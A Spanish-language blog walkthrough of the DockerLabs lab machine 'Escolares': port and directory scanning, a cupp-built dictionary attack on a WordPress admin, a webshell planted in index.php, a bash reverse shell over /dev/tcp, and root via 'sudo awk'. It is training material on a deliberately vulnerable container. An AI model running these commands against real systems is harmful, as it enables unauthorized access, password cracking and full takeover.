---
layout: post
title: "Escolares"
date: 2024-10-18
 13:00:23
category: dockerlabs
vm: dockerlabsfacil
---

<table class="log">
  <tr>
    <td rowspan="5"><img src="/notas/public/img/dockerlabs/dockerlabs.png" width=260></td>
    <td></td>
  </tr>
  <tr> <td><strong>Máquina:</strong> Escolares </td> </tr>
  <tr> <td><strong>SO:</strong> Linux</td> </tr>
  <tr> <td><strong>Nivel:</strong> <span class="easy">Facil</span></td> </tr>
  <tr> <td><strong><a href="https://dockerlabs.es" target="_blank"> DockerLabs</a></strong></td> </tr>
</table>

<br>

**1\.** Descubrimos los puertos disponibles del host, hay dos servicios corriendo, ssh y servicio web de apache.

`sudo nmap -p- --open -T5 --min-rate=5000 -sCV -n -Pn 172.17.0.2`

![img](/notas/public/img/dockerlabs/escolares/nmap.png){:.margin}

**2\.** Tenemos una pagina pero sin mas, no encontramos nada interesante por el momento.

`http://172.17.0.2`

![img](/notas/public/img/dockerlabs/escolares/80.png){:.margin}

**3\.** Hacemos fuzzing y vemos que tenemos un wordpress 

`gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,php,txt,js -q`

![img](/notas/public/img/dockerlabs/escolares/gobuster.png){:.margin}

**4\.** Vamos  al wordpress, viendo su codigo fuente podemos ver que llama recursos de un dominio interno.

`http://172.17.0.2/wordpress/`

![img](/notas/public/img/dockerlabs/escolares/80wordpress.png){:.margin}

**5\.** Agregamos el dominio al etc/hosts para que nos resuelva y podamos trabajar correctamente con este dominio.

`nano /etc/hosts`

`172.17.0.2  escolares.dl`

`escolares.dl/wordpress/`

![img](/notas/public/img/dockerlabs/escolares/nanohosts.png){:.margin}
![img](/notas/public/img/dockerlabs/escolares/80wordpressok.png){:.margin}

**6\.** Podemos hacer un poco de fuzzing, encontramos el panel login del administrador

`gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,php,txt,js -q`

![img](/notas/public/img/dockerlabs/escolares/gobuster.png){:.margin}

**7\.** Escaneamos usuarios y plugins vulnerables; nos encuentra el usuario luisillo.

`wpscan --url http://escolares.dl/wordpress -e vp,u`

![img](/notas/public/img/dockerlabs/escolares/wpscanuser.png){:.margin}

**8\.** En este punto vamos a revisar la seccion de profesores en la web, ahi tenemos a luis y que ademas es administrador.

`http://escolares.dl/profesores.html`

![img](/notas/public/img/dockerlabs/escolares/profesores.png){:.margin}

**9\.** Con informacion a la mano del usuario procedemos a generar un diccionario con los datos.

`sudo apt install cupp`

`cupp -i`

![img](/notas/public/img/dockerlabs/escolares/cupp.png){:.margin}

**10\.** Toca realizar el ataque de diccionario hacia el usuario luisillo; y rapidamente nos pilla la contraseña.

`wpscan --url http://escolares.dl/wordpress -U luisillo -P ./luis.txt`

![img](/notas/public/img/dockerlabs/escolares/wpscanpass.png){:.margin}

**11\.** Ingresamos al panel administrativo de wordpress, una vez dentro editamos el archivo index.php.

`http://escolares.dl/wordpress/admin`

![img](/notas/public/img/dockerlabs/escolares/wpfilemanager.png){:.margin}
![img](/notas/public/img/dockerlabs/escolares/indexcode.png){:.margin}

**12\.** Como vemos ya tenemos una webshell, ahora toca ponernos en escucha con nc y obtener una reverse shell.

`http://escolares.dl/wordpress/?cmd=id`

`nc -nlvp 4000`

`http://escolares.dl/wordpress/?cmd=bash -c "bash -i>%26 /dev/tcp/192.168.18.8/4000 0>%261"`

![img](/notas/public/img/dockerlabs/escolares/nc.png){:.margin}
![img](/notas/public/img/dockerlabs/escolares/ncok.png){:.margin}

**13\.** Vamos al directorio home, y encontramos la contraseña de luisillo, migramos a ese usuario.

`cat /home/secret.txt`

`su luisillo`

![img](/notas/public/img/dockerlabs/escolares/luisillopass.png){:.margin}

**14\.** Revisamos los permisos sudo del usuario, tenemos un binario con todos los permisos.

`sudo -l`

![img](/notas/public/img/dockerlabs/escolares/sudol.png){:.margin}

**15\.** Nos ayudamos con [gtfobins](https://gtfobins.github.io/gtfobins/awk/#sudo) para el uso del binario y escalar a root.

`sudo awk 'BEGIN {system("/bin/bash")}'`

![img](/notas/public/img/dockerlabs/escolares/root.png){:.margin}

<br>

<a href="#">_Finalizado._</a>